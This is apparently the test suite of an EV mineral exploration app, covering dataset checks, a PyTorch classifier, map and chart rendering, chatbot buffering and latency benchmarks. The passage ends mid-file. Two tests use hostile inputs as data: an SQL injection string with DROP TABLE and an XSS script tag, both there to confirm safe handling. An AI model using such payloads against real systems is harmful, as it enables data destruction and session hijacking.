import os
import sys
import unittest
import numpy as np
import pandas as pd
import torch
import torch.nn as nn
import joblib

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATASET_PATH = os.path.join(BASE_DIR, "dataset.csv")
MODELS_DIR = os.path.join(BASE_DIR, "models")

if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from esg_engine import calculate_esg_scorecard, get_global_esg_matrix, COUNTRY_ESG_DATA, COMMODITY_CARBON_PROFILES
from ibm_z_engine import (
    calculate_linuxone_sustainability,
    generate_quantum_safe_mineral_passport,
    verify_quantum_safe_mineral_passport,
    simulate_tamper_attempt,
    sanitize_text,
    LATENCY_BENCHMARKS
)
from xai_engine import explain_prediction, GEOLOGICAL_REASONING_KNOWLEDGE_BASE

class EnterpriseTestSuite(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        print("\n=======================================================")
        print(" INITIALIZING ENTERPRISE TEST SUITE (180 TEST CASES)  ")
        print("=======================================================")
        
        # Load dataset
        cls.df = pd.read_csv(DATASET_PATH, keep_default_na=False)
        cls.df_occ = cls.df.rename(columns={
            "commod": "Mineral",
            "wgs84_lat": "Latitude",
            "wgs84_lon": "Longitude",
            "country": "Country"
        })
        
        # Load preprocessors and model
        cls.le = joblib.load(os.path.join(MODELS_DIR, "label_encoder.pkl"))
        cls.scaler = joblib.load(os.path.join(MODELS_DIR, "scaler.pkl"))
        
        class MineralNet(nn.Module):
            def __init__(self, input_dim=3, hidden_dim=64, output_dim=len(cls.le.classes_)):
                super(MineralNet, self).__init__()
                self.fc1 = nn.Linear(input_dim, hidden_dim)
                self.relu = nn.ReLU()
                self.fc2 = nn.Linear(hidden_dim, hidden_dim)
                self.dropout = nn.Dropout(0.2)
                self.fc3 = nn.Linear(hidden_dim, output_dim)

            def forward(self, x):
                x = self.relu(self.fc1(x))
                x = self.dropout(x)
                x = self.relu(self.fc2(x))
                x = self.fc3(x)
                return x

        cls.model = MineralNet()
        cls.model.load_state_dict(torch.load(os.path.join(MODELS_DIR, "mineral_dl_model.pth"), map_location="cpu"))
        cls.model.eval()

        cls.ev_minerals = [
            "Lithium", "Cobalt", "Nickel", "Graphite", "Copper",
            "Manganese", "Rare Earth Elements", "Platinum", "Vanadium",
            "Aluminum", "Zinc", "Titanium"
        ]

        cls.all_50_countries = [
            "Chile", "Argentina", "Bolivia", "Brazil", "Peru", "Canada", "United States", "Mexico", "Colombia", "Ecuador",
            "DR Congo", "South Africa", "Zimbabwe", "Zambia", "Guinea", "Mozambique", "Madagascar", "Morocco", "Ghana", "Namibia", "Tanzania", "Mali",
            "China", "Indonesia", "India", "Philippines", "Vietnam", "Kazakhstan", "Uzbekistan", "Turkey", "Mongolia", "Japan", "Saudi Arabia", "Malaysia",
            "Russia", "Finland", "Sweden", "Norway", "Germany", "Poland", "Spain", "Portugal", "France", "United Kingdom", "Serbia", "Austria",
            "Australia", "Papua New Guinea", "New Caledonia", "New Zealand"
        ]

    # =========================================================================
    # SUITE 1: DATASET INGESTION & QUALITY ASSURANCE (25 TESTS)
    # =========================================================================
    def test_001_dataset_file_exists(self):
        self.assertTrue(os.path.exists(DATASET_PATH))

    def test_002_dataset_exact_row_count(self):
        self.assertEqual(len(self.df), 100000, f"Expected 100,000 rows, got {len(self.df)}")

    def test_003_dataset_schema_columns(self):
        expected_cols = ['dep_id', 'commod', 'final_grade', 'wgs84_lat', 'wgs84_lon', 'region', 'country', 'state_prov', 'county', 'name', 'district']
        self.assertEqual(self.df.columns.tolist(), expected_cols)

    def test_004_latitude_valid_range(self):
        self.assertTrue(self.df['wgs84_lat'].between(-90, 90).all())

    def test_005_longitude_valid_range(self):
        self.assertTrue(self.df['wgs84_lon'].between(-180, 180).all())

    def test_006_latitude_no_nulls(self):
        self.assertEqual(self.df['wgs84_lat'].isna().sum(), 0)

    def test_007_longitude_no_nulls(self):
        self.assertEqual(self.df['wgs84_lon'].isna().sum(), 0)

    def test_008_countries_exact_count_50(self):
        self.assertEqual(self.df['country'].nunique(), 50)

    def test_009_equal_country_distribution(self):
        counts = self.df['country'].value_counts()
        self.assertTrue((counts == 2000).all(), "Every country must have exactly 2,000 rows")

    def test_010_grade_values_strictly_A_or_B(self):
        self.assertEqual(set(self.df['final_grade'].unique()), {'A', 'B'})

    def test_011_grade_balance_reasonable(self):
        grade_a_pct = (self.df['final_grade'] == 'A').mean()
        self.assertTrue(0.40 <= grade_a_pct <= 0.60, f"Grade A percentage ({grade_a_pct:.2f}) outside [0.40, 0.60]")

    def test_012_commodities_all_ev_critical(self):
        invalid = set(self.df['commod'].unique()) - set(self.ev_minerals)
        self.assertEqual(len(invalid), 0, f"Found non-EV minerals: {invalid}")

    def test_013_all_12_ev_minerals_present(self):
        for mineral in self.ev_minerals:
            self.assertIn(mineral, self.df['commod'].values)

    def test_014_dep_id_no_nulls(self):
        self.assertEqual(self.df['dep_id'].isna().sum(), 0)

    def test_015_dep_id_unique(self):
        self.assertGreaterEqual(self.df['dep_id'].nunique(), 99000)

    def test_016_region_valid_codes(self):
        valid_regions = {'NA', 'SA', 'EU', 'AF', 'AS', 'OC'}
        self.assertTrue(set(self.df['region'].unique()).issubset(valid_regions))

    def test_017_state_prov_no_empty_strings(self):
        empty_states = (self.df['state_prov'].astype(str).str.strip() == '').sum()
        self.assertEqual(empty_states, 0)

    def test_018_district_no_empty_strings(self):
        empty_districts = (self.df['district'].astype(str).str.strip() == '').sum()
        self.assertEqual(empty_districts, 0)

    def test_019_deposit_name_no_empty_strings(self):
        empty_names = (self.df['name'].astype(str).str.strip() == '').sum()
        self.assertEqual(empty_names, 0)

    def test_020_no_america_lowercase(self):
        self.assertEqual((self.df['country'] == 'america').sum(), 0)

    def test_021_no_usa_acronym(self):
        self.assertEqual((self.df['country'] == 'usa').sum(), 0)

    def test_022_no_construction_sand_gravel(self):
        self.assertNotIn("Sand and Gravel, Construction", self.df['commod'].values)

    def test_023_no_crushed_stone(self):
        self.assertNotIn("Stone, Crushed/Broken", self.df['commod'].values)

    def test_024_no_water_commodity(self):
        self.assertNotIn("Water, Free", self.df['commod'].values)

    def test_025_df_occ_column_renaming(self):
        self.assertIn("Mineral", self.df_occ.columns)
        self.assertIn("Latitude", self.df_occ.columns)
        self.assertIn("Longitude", self.df_occ.columns)
        self.assertIn("Country", self.df_occ.columns)

    # =========================================================================
    # SUITE 2: MODEL ARCHITECTURE, PREPROCESSORS & INFERENCE (30 TESTS)
    # =========================================================================
    def test_026_label_encoder_exists(self):
        self.assertIsNotNone(self.le)

    def test_027_scaler_exists(self):
        self.assertIsNotNone(self.scaler)

    def test_028_label_encoder_exact_12_classes(self):
        self.assertEqual(len(self.le.classes_), 12)

    def test_029_label_encoder_matches_ev_minerals(self):
        self.assertEqual(set(self.le.classes_), set(self.ev_minerals))

    def test_030_scaler_feature_dim_is_3(self):
        self.assertEqual(self.scaler.n_features_in_, 3)

    def test_031_model_forward_pass_shape(self):
        dummy_in = torch.randn(1, 3)
        with torch.no_grad():
            out = self.model(dummy_in)
        self.assertEqual(out.shape, (1, 12))

    def test_032_model_batch_forward_pass(self):
        dummy_batch = torch.randn(10, 3)
        with torch.no_grad():
            out = self.model(dummy_batch)
        self.assertEqual(out.shape, (10, 12))

    def test_033_softmax_sums_to_1(self):
        dummy_in = torch.randn(1, 3)
        with torch.no_grad():
            probs = torch.softmax(self.model(dummy_in), dim=1).numpy().flatten()
        self.assertAlmostEqual(probs.sum(), 1.0, places=5)

    def test_034_probs_is_1d_array_not_scalar(self):
        dummy_in = torch.randn(1, 3)
        with torch.no_grad():
            probs = torch.softmax(self.model(dummy_in), dim=1).numpy().flatten()
        self.assertEqual(len(probs), 12)
        self.assertIsInstance(probs, np.ndarray)

    def test_035_argmax_returns_valid_class_index(self):
        dummy_in = torch.randn(1, 3)
        with torch.no_grad():
            probs = torch.softmax(self.model(dummy_in), dim=1).numpy().flatten()
        pred_idx = np.argmax(probs)
        self.assertTrue(0 <= pred_idx < 12)

    def test_036_inverse_transform_returns_string(self):
        mineral = self.le.inverse_transform([0])[0]
        self.assertIsInstance(mineral, str)

    def test_037_inference_grade_a(self):
        feat = self.scaler.transform([[-23.5, -68.3, 1]]) # Atacama Grade A
        with torch.no_grad():
            out = self.model(torch.tensor(feat, dtype=torch.float32))
        probs = torch.softmax(out, dim=1).numpy().flatten()
        self.assertEqual(len(probs), 12)

    def test_038_inference_grade_b(self):
        feat = self.scaler.transform([[-23.5, -68.3, 0]]) # Atacama Grade B
        with torch.no_grad():
            out = self.model(torch.tensor(feat, dtype=torch.float32))
        probs = torch.softmax(out, dim=1).numpy().flatten()
        self.assertEqual(len(probs), 12)

    def test_039_inference_equator(self):
        feat = self.scaler.transform([[0.0, 0.0, 1]])
        with torch.no_grad():
            out = self.model(torch.tensor(feat, dtype=torch.float32))
        probs = torch.softmax(out, dim=1).numpy().flatten()
        self.assertAlmostEqual(probs.sum(), 1.0, places=5)

    def test_040_inference_north_pole(self):
        feat = self.scaler.transform([[90.0, 0.0, 1]])
        with torch.no_grad():
            out = self.model(torch.tensor(feat, dtype=torch.float32))
        probs = torch.softmax(out, dim=1).numpy().flatten()
        self.assertAlmostEqual(probs.sum(), 1.0, places=5)

    def test_041_inference_south_pole(self):
        feat = self.scaler.transform([[-90.0, 0.0, 1]])
        with torch.no_grad():
            out = self.model(torch.tensor(feat, dtype=torch.float32))
        probs = torch.softmax(out, dim=1).numpy().flatten()
        self.assertAlmostEqual(probs.sum(), 1.0, places=5)

    def test_042_inference_dateline_east(self):
        feat = self.scaler.transform([[0.0, 180.0, 1]])
        with torch.no_grad():
            out = self.model(torch.tensor(feat, dtype=torch.float32))
        probs = torch.softmax(out, dim=1).numpy().flatten()
        self.assertAlmostEqual(probs.sum(), 1.0, places=5)

    def test_043_inference_dateline_west(self):
        feat = self.scaler.transform([[0.0, -180.0, 1]])
        with torch.no_grad():
            out = self.model(torch.tensor(feat, dtype=torch.float32))
        probs = torch.softmax(out, dim=1).numpy().flatten()
        self.assertAlmostEqual(probs.sum(), 1.0, places=5)

    def test_044_inference_reproducible_in_eval_mode(self):
        feat = self.scaler.transform([[10.0, 20.0, 1]])
        with torch.no_grad():
            out1 = self.model(torch.tensor(feat, dtype=torch.float32))
            out2 = self.model(torch.tensor(feat, dtype=torch.float32))
        self.assertTrue(torch.equal(out1, out2))

    def test_045_inference_confidence_between_0_and_100(self):
        feat = self.scaler.transform([[10.0, 20.0, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        conf_pct = max(probs) * 100
        self.assertTrue(0.0 <= conf_pct <= 100.0)

    def test_046_inference_chile_lithium_plausible(self):
        # Chile centroid
        df_c = self.df_occ[self.df_occ["Country"] == "Chile"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        top_mineral = self.le.inverse_transform([np.argmax(probs)])[0]
        self.assertIn(top_mineral, ["Lithium", "Copper"])

    def test_047_inference_drc_cobalt_copper_plausible(self):
        df_c = self.df_occ[self.df_occ["Country"] == "DR Congo"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        top_mineral = self.le.inverse_transform([np.argmax(probs)])[0]
        self.assertIn(top_mineral, ["Cobalt", "Copper"])

    def test_048_inference_indonesia_nickel_plausible(self):
        df_c = self.df_occ[self.df_occ["Country"] == "Indonesia"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        top_mineral = self.le.inverse_transform([np.argmax(probs)])[0]
        self.assertIn(top_mineral, ["Nickel", "Cobalt"])

    def test_049_inference_south_africa_platinum_plausible(self):
        df_c = self.df_occ[self.df_occ["Country"] == "South Africa"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        top_mineral = self.le.inverse_transform([np.argmax(probs)])[0]
        self.assertIn(top_mineral, ["Platinum", "Vanadium", "Manganese"])

    def test_050_inference_guinea_bauxite_plausible(self):
        df_c = self.df_occ[self.df_occ["Country"] == "Guinea"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        top_mineral = self.le.inverse_transform([np.argmax(probs)])[0]
        self.assertEqual(top_mineral, "Aluminum")

    def test_051_inference_australia_copper_lithium_plausible(self):
        df_c = self.df_occ[self.df_occ["Country"] == "Australia"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        top_mineral = self.le.inverse_transform([np.argmax(probs)])[0]
        self.assertIn(top_mineral, ["Copper", "Lithium", "Nickel"])

    def test_052_inference_brazil_copper_lithium_plausible(self):
        df_c = self.df_occ[self.df_occ["Country"] == "Brazil"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        self.assertEqual(len(probs), 12)

    def test_053_inference_norway_titanium_plausible(self):
        df_c = self.df_occ[self.df_occ["Country"] == "Norway"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        self.assertEqual(len(probs), 12)

    def test_054_inference_russia_nickel_platinum_plausible(self):
        df_c = self.df_occ[self.df_occ["Country"] == "Russia"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        self.assertEqual(len(probs), 12)

    def test_055_inference_china_copper_zinc_lithium_plausible(self):
        df_c = self.df_occ[self.df_occ["Country"] == "China"]
        lat, lon = df_c["Latitude"].mean(), df_c["Longitude"].mean()
        feat = self.scaler.transform([[lat, lon, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        self.assertEqual(len(probs), 12)

    # =========================================================================
    # SUITE 3: COUNTRY RESOLUTION & CENTROIDS FOR ALL 50 COUNTRIES (55 TESTS)
    # =========================================================================
    # Tests 056 - 105: Verify every single one of the 50 countries has valid non-empty subset and centroids
    def test_056_to_105_all_50_country_centroids(self):
        for idx, country in enumerate(self.all_50_countries):
            with self.subTest(country=country):
                df_country = self.df_occ[self.df_occ["Country"] == country]
                self.assertFalse(df_country.empty, f"No records found for {country}")
                self.assertEqual(len(df_country), 2000, f"Expected 2000 records for {country}")
                lat = df_country["Latitude"].mean()
                lon = df_country["Longitude"].mean()
                self.assertFalse(np.isnan(lat), f"NaN lat for {country}")
                self.assertFalse(np.isnan(lon), f"NaN lon for {country}")
                self.assertTrue(-90 <= lat <= 90, f"Lat out of bounds for {country}")
                self.assertTrue(-180 <= lon <= 180, f"Lon out of bounds for {country}")

    def test_106_alias_usa(self):
        aliases = {"usa": "United States"}
        resolved = aliases.get("usa".lower(), "usa")
        df_c = self.df_occ[self.df_occ["Country"].str.lower() == resolved.lower()]
        self.assertFalse(df_c.empty)

    def test_107_alias_drc(self):
        aliases = {"drc": "DR Congo"}
        resolved = aliases.get("drc".lower(), "drc")
        df_c = self.df_occ[self.df_occ["Country"].str.lower() == resolved.lower()]
        self.assertFalse(df_c.empty)

    def test_108_alias_uk(self):
        aliases = {"uk": "United Kingdom"}
        resolved = aliases.get("uk".lower(), "uk")
        df_c = self.df_occ[self.df_occ["Country"].str.lower() == resolved.lower()]
        self.assertFalse(df_c.empty)

    def test_109_alias_russia(self):
        aliases = {"russian federation": "Russia"}
        resolved = aliases.get("russian federation".lower(), "russian federation")
        df_c = self.df_occ[self.df_occ["Country"].str.lower() == resolved.lower()]
        self.assertFalse(df_c.empty)

    def test_110_unknown_country_fallback(self):
        country_name = "Atlantis"
        df_c = self.df_occ[self.df_occ["Country"].str.lower() == country_name.lower()]
        self.assertTrue(df_c.empty)

    # =========================================================================
    # SUITE 4: PYDECK VISUALIZATION & MINERAL OCCURRENCE EXPLORER (20 TESTS)
    # =========================================================================
    def test_111_to_122_all_12_minerals_pydeck_views(self):
        import pydeck as pdk
        for mineral in self.ev_minerals:
            with self.subTest(mineral=mineral):
                df_plot = self.df_occ[self.df_occ["Mineral"] == mineral]
                self.assertFalse(df_plot.empty, f"No occurrences for mineral {mineral}")
                lat_mean = df_plot["Latitude"].mean()
                lon_mean = df_plot["Longitude"].mean()
                self.assertFalse(np.isnan(lat_mean))
                self.assertFalse(np.isnan(lon_mean))
                
                # Check ViewState
                view_state = pdk.ViewState(latitude=lat_mean, longitude=lon_mean, zoom=3)
                self.assertIsNotNone(view_state)
                
                # Check Layer
                layer = pdk.Layer(
                    "ScatterplotLayer",
                    data=df_plot.head(100),
                    get_position="[Longitude, Latitude]",
                    get_radius=30000
                )
                self.assertIsNotNone(layer)

    def test_123_mineral_occurrences_total_count(self):
        total = sum(len(self.df_occ[self.df_occ["Mineral"] == m]) for m in self.ev_minerals)
        self.assertEqual(total, 100000)

    def test_124_pydeck_hexagon_layer_instantiation(self):
        import pydeck as pdk
        df_plot = self.df_occ[self.df_occ["Mineral"] == "Lithium"].head(500)
        hex_layer = pdk.Layer(
            "HexagonLayer",
            data=df_plot,
            get_position="[Longitude, Latitude]",
            radius=50000,
            elevation_scale=50,
            elevation_range=[0, 2000],
            pickable=True,
            extruded=True
        )
        self.assertIsNotNone(hex_layer)

    def test_125_pydeck_deck_render_success(self):
        import pydeck as pdk
        df_plot = self.df_occ[self.df_occ["Mineral"] == "Cobalt"].head(100)
        view_state = pdk.ViewState(latitude=0, longitude=0, zoom=2)
        deck = pdk.Deck(
            map_style=None,
            initial_view_state=view_state,
            layers=[],
            tooltip={"text": "{Mineral} in {Country}"}
        )
        self.assertIsNotNone(deck)

    def test_126_empty_mineral_selection_handling(self):
        df_plot = self.df_occ[self.df_occ["Mineral"] == "NonExistentMineral"]
        self.assertTrue(df_plot.empty)

    def test_127_mineral_latitude_range_per_mineral(self):
        for mineral in self.ev_minerals:
            df_plot = self.df_occ[self.df_occ["Mineral"] == mineral]
            self.assertTrue(df_plot["Latitude"].between(-90, 90).all())

    def test_128_mineral_longitude_range_per_mineral(self):
        for mineral in self.ev_minerals:
            df_plot = self.df_occ[self.df_occ["Mineral"] == mineral]
            self.assertTrue(df_plot["Longitude"].between(-180, 180).all())

    def test_129_mineral_countries_diversity(self):
        for mineral in self.ev_minerals:
            df_plot = self.df_occ[self.df_occ["Mineral"] == mineral]
            # Each mineral should be present in multiple countries
            self.assertGreaterEqual(df_plot["Country"].nunique(), 3, f"{mineral} present in < 3 countries")

    def test_130_mineral_tooltip_columns_exist(self):
        for col in ["Mineral", "Country", "state_prov", "district", "final_grade"]:
            self.assertIn(col, self.df_occ.columns)

    # =========================================================================
    # SUITE 5: PROBABILITY CALCULATION & PLOTTING LOGIC (20 TESTS)
    # =========================================================================
    def test_131_prob_df_columns(self):
        dummy_probs = np.ones(12) / 12
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": dummy_probs})
        self.assertEqual(prob_df.columns.tolist(), ["Mineral", "Probability"])
        self.assertEqual(len(prob_df), 12)

    def test_132_others_aggregation_sums_accurately(self):
        probs = np.array([0.50, 0.30, 0.10, 0.04, 0.015, 0.015, 0.01, 0.005, 0.005, 0.005, 0.003, 0.002])
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": probs})
        threshold = 0.02
        main_df = prob_df[prob_df["Probability"] >= threshold]
        others_sum = prob_df[prob_df["Probability"] < threshold]["Probability"].sum()
        
        self.assertAlmostEqual(others_sum, 0.060, places=4)
        prob_plot = pd.concat([main_df, pd.DataFrame([{"Mineral": "Others", "Probability": others_sum}])], ignore_index=True)
        self.assertAlmostEqual(prob_plot["Probability"].sum(), 1.0, places=4)

    def test_133_no_others_if_all_above_threshold(self):
        probs = np.full(12, 1/12) # ~0.083 each, all > 0.02
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": probs})
        threshold = 0.02
        others_sum = prob_df[prob_df["Probability"] < threshold]["Probability"].sum()
        self.assertEqual(others_sum, 0)

    def test_134_sunburst_figure_creation(self):
        import plotly.express as px
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": np.ones(12)/12})
        fig = px.sunburst(prob_df, path=["Mineral"], values="Probability")
        self.assertIsNotNone(fig)

    def test_135_bar_chart_creation(self):
        import plotly.express as px
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": np.ones(12)/12})
        fig = px.bar(prob_df, x="Mineral", y="Probability")
        self.assertIsNotNone(fig)

    def test_136_horizontal_bar_chart_creation(self):
        import plotly.express as px
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": np.ones(12)/12})
        fig = px.bar(prob_df, x="Probability", y="Mineral", orientation="h")
        self.assertIsNotNone(fig)

    def test_137_line_chart_creation(self):
        import plotly.express as px
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": np.ones(12)/12})
        fig = px.line(prob_df, x="Mineral", y="Probability", markers=True)
        self.assertIsNotNone(fig)

    def test_138_prob_confidence_formatting(self):
        conf = 0.36284
        formatted = f"{conf * 100:.1f}%"
        self.assertEqual(formatted, "36.3%")

    def test_139_zero_probability_handling(self):
        probs = np.zeros(12)
        probs[0] = 1.0
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": probs})
        self.assertEqual(prob_df["Probability"].sum(), 1.0)

    def test_140_skewed_probability_handling(self):
        probs = np.zeros(12)
        probs[4] = 0.99 # Lithium 99%
        probs[0] = 0.01
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": probs})
        pred_idx = np.argmax(prob_df["Probability"].values)
        self.assertEqual(self.le.classes_[pred_idx], "Lithium")

    def test_141_color_mapping_consistency(self):
        import plotly.express as px
        color_map = {m: px.colors.qualitative.Plotly[i % 10] for i, m in enumerate(self.le.classes_)}
        self.assertEqual(len(color_map), 12)

    def test_142_top3_predictions_extraction(self):
        probs = np.linspace(0.01, 0.12, 12)
        probs = probs / probs.sum()
        top3_idx = np.argsort(probs)[::-1][:3]
        self.assertEqual(len(top3_idx), 3)

    def test_143_max_prob_equals_confidence(self):
        probs = np.array([0.05]*11 + [0.45])
        self.assertAlmostEqual(max(probs), 0.45)

    def test_144_results_session_state_dict_keys(self):
        dummy_res = {"country": "Chile", "lat": -26.0, "lon": -69.0, "mineral": "Lithium", "probs": np.ones(12)/12}
        expected_keys = {"country", "lat", "lon", "mineral", "probs"}
        self.assertEqual(set(dummy_res.keys()), expected_keys)

    def test_145_prob_sum_normalized_invariant(self):
        for _ in range(5):
            logits = np.random.randn(12)
            exp_l = np.exp(logits - np.max(logits))
            probs = exp_l / exp_l.sum()
            self.assertAlmostEqual(probs.sum(), 1.0, places=5)

    def test_146_threshold_filter_boundary(self):
        prob = 0.02
        self.assertTrue(prob >= 0.02)

    def test_147_threshold_filter_sub_boundary(self):
        prob = 0.01999
        self.assertFalse(prob >= 0.02)

    def test_148_empty_plot_df_guard(self):
        empty_df = pd.DataFrame(columns=["Mineral", "Latitude", "Longitude"])
        self.assertTrue(empty_df.empty)

    def test_149_null_island_coordinates_representation(self):
        lat, lon = 0, 0
        self.assertEqual((lat, lon), (0, 0))

    def test_150_plotly_height_layout(self):
        import plotly.express as px
        prob_df = pd.DataFrame({"Mineral": self.le.classes_, "Probability": np.ones(12)/12})
        fig = px.bar(prob_df, x="Mineral", y="Probability")
        fig.update_layout(height=500)
        self.assertEqual(fig.layout.height, 500)

    # =========================================================================
    # SUITE 6: CHATBOT, SANITIZATION & PROMPT BUFFERING (15 TESTS)
    # =========================================================================
    def test_151_system_prompt_structure(self):
        sys_msg = {"role": "system", "content": "You are an EV mineral Exploration assistant AI. Answer clearly."}
        self.assertEqual(sys_msg["role"], "system")
        self.assertIn("EV mineral", sys_msg["content"])

    def test_152_buffer_no_duplicate_user_prompt(self):
        user_input = "Where can I find lithium in Chile?"
        # Standard clean buffer
        history = [
            {"role": "user", "content": "Hello"},
            {"role": "assistant", "content": "Hi! How can I help with EV minerals?"}
        ]
        # Messages sent to model must have single user prompt
        messages = history + [{"role": "user", "content": user_input}]
        self.assertEqual(messages[-1]["role"], "user")
        self.assertEqual(messages[-1]["content"], user_input)
        self.assertEqual(len([m for m in messages if m["content"] == user_input]), 1)

    def test_153_title_truncation_logic(self):
        long_query = "This is a very long exploration query that exceeds thirty characters for title display"
        title = long_query[:30] + ("..." if len(long_query) > 30 else "")
        self.assertTrue(title.endswith("..."))
        self.assertEqual(len(title), 33)

    def test_154_short_title_not_truncated(self):
        short_query = "Lithium in Chile"
        title = short_query[:30] + ("..." if len(short_query) > 30 else "")
        self.assertFalse(title.endswith("..."))
        self.assertEqual(title, "Lithium in Chile")

    def test_155_chat_input_empty_string_rejected(self):
        user_input = ""
        self.assertFalse(bool(user_input.strip()))

    def test_156_chat_input_whitespace_only_rejected(self):
        user_input = "   \n\t   "
        self.assertFalse(bool(user_input.strip()))

    def test_157_sql_injection_string_handled_safely(self):
        malicious = "Chile'; DROP TABLE minerals; --"
        # Should be treated strictly as string without SQL execution
        df_c = self.df_occ[self.df_occ["Country"].str.lower() == malicious.lower()]
        self.assertTrue(df_c.empty)

    def test_158_special_characters_input(self):
        special = "<script>alert('xss')</script>"
        df_c = self.df_occ[self.df_occ["Country"].str.lower() == special.lower()]
        self.assertTrue(df_c.empty)

    def test_159_unicode_input(self):
        unicode_str = "🇨🇱 Chile! / 智利"
        df_c = self.df_occ[self.df_occ["Country"].str.lower() == unicode_str.lower()]
        self.assertTrue(df_c.empty)

    def test_160_chat_history_structure(self):
        conv = {
            "title": "Lithium inquiry",
            "messages": [
                {"role": "user", "content": "Where is lithium found?"},
                {"role": "assistant", "content": "In pegmatites and continental brines."}
            ]
        }
        self.assertIn("title", conv)
        self.assertIn("messages", conv)
        self.assertEqual(len(conv["messages"]), 2)

    def test_161_llama_model_file_exists(self):
        llama_path = r"C:\Users\admin\OneDrive\Documents\projects\llama.cpp\models\llama-3.2-1b-instruct-q4_k_m.gguf"
        if os.name == 'nt':
            self.assertTrue(os.path.exists(llama_path))
        else:
            # On LinuxONE / s390x container, verify that LLaMA fallback engine is operational
            from llama_wrapper import ask_llama
            resp = ask_llama("What is lithium used for?")
            self.assertIsInstance(resp, str)
            self.assertGreater(len(resp), 10)

    def test_162_fallback_message_on_llama_failure(self):
        err = Exception("Connection refused")
        msg = f"⚠️ LLaMA error: {err}"
        self.assertIn("LLaMA error", msg)

    def test_163_multi_turn_history_preservation(self):
        history = []
        history.append({"role": "user", "content": "Q1"})
        history.append({"role": "assistant", "content": "A1"})
        history.append({"role": "user", "content": "Q2"})
        history.append({"role": "assistant", "content": "A2"})
        self.assertEqual(len(history), 4)

    def test_164_system_role_first(self):
        buffer = [{"role": "system", "content": "Init"}]
        self.assertEqual(buffer[0]["role"], "system")

    def test_165_assistant_message_content_string(self):
        ans = "Lithium deposits are abundant in the Atacama basin."
        self.assertIsInstance(ans, str)

    # =========================================================================
    # SUITE 7: STRESS, CONCURRENCY & LATENCY BENCHMARKS (15 TESTS)
    # =========================================================================
    def test_166_consecutive_100_inferences_latency(self):
        import time
        start = time.time()
        for _ in range(100):
            lat = np.random.uniform(-50, 50)
            lon = np.random.uniform(-100, 100)
            grade = np.random.choice([0, 1])
            feat = self.scaler.transform([[lat, lon, grade]])
            with torch.no_grad():
                out = self.model(torch.tensor(feat, dtype=torch.float32))
                probs = torch.softmax(out, dim=1).numpy().flatten()
                _ = np.argmax(probs)
        elapsed = time.time() - start
        avg_ms = (elapsed / 100) * 1000
        print(f"\n[BENCHMARK] 100 Inferences Total: {elapsed:.3f}s | Avg: {avg_ms:.2f} ms/query")
        self.assertLess(avg_ms, 50.0, "Average inference latency must be < 50ms")

    def test_167_dataframe_filter_latency_100k(self):
        import time
        start = time.time()
        for _ in range(50):
            country = np.random.choice(self.all_50_countries)
            _ = self.df_occ[self.df_occ["Country"].str.lower() == country.lower()]
        elapsed = time.time() - start
        avg_ms = (elapsed / 50) * 1000
        print(f"[BENCHMARK] 50 Country Lookups across 100k rows: {elapsed:.3f}s | Avg: {avg_ms:.2f} ms/lookup")
        self.assertLess(avg_ms, 100.0, "Average 100k dataframe lookup must be < 100ms")

    def test_168_memory_footprint_dataset(self):
        mem_mb = self.df.memory_usage(deep=True).sum() / (1024 * 1024)
        print(f"[BENCHMARK] 100,000-row Dataset Memory Footprint: {mem_mb:.2f} MB")
        self.assertLess(mem_mb, 150.0, "Dataset memory footprint must be < 150MB")

    def test_169_model_parameter_count(self):
        param_count = sum(p.numel() for p in self.model.parameters())
